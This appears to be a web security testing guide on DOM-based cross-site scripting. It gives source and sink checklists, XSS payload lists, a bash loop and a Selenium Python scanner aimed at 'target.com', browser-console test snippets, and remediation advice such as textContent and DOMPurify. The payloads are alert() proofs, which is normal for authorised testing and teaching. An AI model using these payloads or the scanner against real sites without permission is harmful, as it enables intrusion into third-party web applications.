# WSTG-CLNT-01: Testing for DOM-Based Cross Site Scripting

## Test ID
WSTG-CLNT-01

## Test Name
Testing for DOM-Based Cross Site Scripting

## High-Level Description

DOM-based XSS occurs when client-side JavaScript processes data from untrusted sources and writes it to the DOM without proper sanitization. Unlike reflected or stored XSS, the payload never reaches the server - the entire attack happens in the browser. This makes DOM XSS harder to detect with server-side security tools.

---

## What to Check

### Sources (User Input)
- [ ] document.URL
- [ ] document.location
- [ ] document.referrer
- [ ] window.location
- [ ] window.name
- [ ] localStorage/sessionStorage
- [ ] URL hash (location.hash)

### Sinks (Dangerous Functions)
- [ ] document.write()
- [ ] innerHTML/outerHTML
- [ ] eval()
- [ ] setTimeout/setInterval (with strings)
- [ ] jQuery.html()
- [ ] location.href
- [ ] element.src

---

## How to Test

### Step 1: Identify Sources and Sinks

```javascript
// Browser console - find potential DOM XSS patterns
// Search JavaScript files for dangerous patterns

// Common source patterns
const sources = [
    'location.hash',
    'location.search',
    'location.href',
    'document.URL',
    'document.referrer',
    'window.name',
    'localStorage',
    'sessionStorage'
];

// Common sink patterns
const sinks = [
    'innerHTML',
    'outerHTML',
    'document.write',
    'eval(',
    'setTimeout(',
    'setInterval(',
    '.html(',
    '.append(',
    'location.href',
    'location.replace'
];

console.log("Check JS files for these patterns");
```

### Step 2: Test URL-Based DOM XSS

```bash
#!/bin/bash
TARGET="https://target.com"

# Test hash-based XSS
payloads=(
    "#<script>alert(1)</script>"
    "#<img src=x onerror=alert(1)>"
    "#javascript:alert(1)"
    "#'-alert(1)-'"
    "#\"><script>alert(1)</script>"
)

for payload in "${payloads[@]}"; do
    echo "Testing: $TARGET/page$payload"
    # Open in browser and check console for execution
done

# Test query parameter XSS
curl -s "$TARGET/search?q=<script>alert(1)</script>" | grep -i "script"
```

### Step 3: DOM XSS Tester

```python
#!/usr/bin/env python3
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import UnexpectedAlertPresentException
import time

class DOMXSSTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

        # Setup headless browser
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--disable-xss-auditor')
        self.driver = webdriver.Chrome(options=options)

    def test_hash_xss(self, page_path):
        """Test hash-based DOM XSS"""
        print(f"[*] Testing hash-based XSS on {page_path}")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]

        for payload in payloads:
            url = f"{self.base_url}{page_path}#{payload}"

            try:
                self.driver.get(url)
                time.sleep(1)

                # Check for alert
                try:
                    alert = self.driver.switch_to.alert
                    print(f"[VULN] DOM XSS via hash: {payload[:30]}")
                    alert.accept()
                    self.findings.append({
                        "type": "hash_xss",
                        "payload": payload,
                        "severity": "High"
                    })
                except:
                    pass

            except UnexpectedAlertPresentException:
                print(f"[VULN] DOM XSS triggered: {payload[:30]}")
                self.findings.append({
                    "type": "hash_xss",
                    "payload": payload,
                    "severity": "High"
                })

    def test_query_xss(self, page_path, param_name):
        """Test query parameter DOM XSS"""
        print(f"\n[*] Testing query param XSS: {param_name}")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img/src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
        ]

        for payload in payloads:
            url = f"{self.base_url}{page_path}?{param_name}={payload}"

            try:
                self.driver.get(url)
                time.sleep(1)

                try:
                    alert = self.driver.switch_to.alert
                    print(f"[VULN] DOM XSS via query: {payload[:30]}")
                    alert.accept()
                    self.findings.append({
                        "type": "query_xss",
                        "parameter": param_name,
                        "payload": payload,
                        "severity": "High"
                    })
                except:
                    pass

            except UnexpectedAlertPresentException:
                print(f"[VULN] DOM XSS triggered")
                self.findings.append({
                    "type": "query_xss",
                    "parameter": param_name,
                    "payload": payload,
                    "severity": "High"
                })

    def analyze_javascript(self, js_url):
        """Analyze JavaScript for DOM XSS patterns"""
        print(f"\n[*] Analyzing JavaScript: {js_url}")

        try:
            response = requests.get(js_url)
            js_code = response.text

            # Dangerous patterns
            patterns = {
                'innerHTML assignment': r'\.innerHTML\s*=',
                'document.write': r'document\.write\s*\(',
                'eval usage': r'eval\s*\(',
                'location.hash sink': r'location\.hash.*innerHTML',
                'jQuery html sink': r'\$\([^)]+\)\.html\s*\(',
            }

            import re
            for name, pattern in patterns.items():
                matches = re.findall(pattern, js_code)
                if matches:
                    print(f"  [WARN] Found {name}: {len(matches)} occurrences")

        except Exception as e:
            print(f"  [ERROR] {e}")

    def close(self):
        self.driver.quit()

    def generate_report(self):
        print("\n" + "="*50)
        print("DOM XSS TESTING REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo DOM XSS vulnerabilities found.")
            return

        print(f"\nVulnerabilities: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  [{f['severity']}] {f['type']}")
            print(f"  Payload: {f['payload'][:50]}")

# Usage
tester = DOMXSSTester("https://target.com")
tester.test_hash_xss("/search")
tester.test_query_xss("/search", "q")
tester.analyze_javascript("https://target.com/main.js")
tester.generate_report()
tester.close()
```

### Step 4: Manual Browser Testing

```javascript
// Paste in browser console on target page

// Test 1: Check if hash is used unsafely
location.hash = "<img src=x onerror=alert('hash-xss')>";

// Test 2: Check postMessage handler
window.postMessage("<img src=x onerror=alert('postMessage')>", "*");

// Test 3: Check localStorage handling
localStorage.setItem('test', '<img src=x onerror=alert("storage")>');
location.reload();
```

---

## Tools

| Tool | Description |
|------|-------------|
| **DOM Invader (Burp)** | Automated DOM XSS testing |
| **Browser DevTools** | Manual analysis |
| **Selenium** | Automated browser testing |

---

## Remediation Guide

### Safe DOM Manipulation

```javascript
// UNSAFE - Direct HTML insertion
element.innerHTML = userInput;

// SAFE - Text content (no HTML parsing)
element.textContent = userInput;

// SAFE - Create elements programmatically
const div = document.createElement('div');
div.textContent = userInput;
parent.appendChild(div);

// SAFE - Use DOMPurify for HTML
element.innerHTML = DOMPurify.sanitize(userInput);
```

### Avoid Dangerous Sinks

```javascript
// AVOID
eval(userInput);
document.write(userInput);
element.innerHTML = userInput;

// USE INSTEAD
JSON.parse(userInput);  // For JSON data
element.textContent = userInput;  // For text
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| DOM XSS via hash | 6.1 | Medium |
| DOM XSS via query param | 6.1 | Medium |
| DOM XSS with session theft | 8.1 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-79** | Improper Neutralization of Input During Web Page Generation |

---

## Checklist

```
[ ] Sources identified in JavaScript
[ ] Sinks identified in JavaScript
[ ] Hash-based XSS tested
[ ] Query parameter XSS tested
[ ] postMessage handlers tested
[ ] Storage-based XSS tested
[ ] Findings documented
```
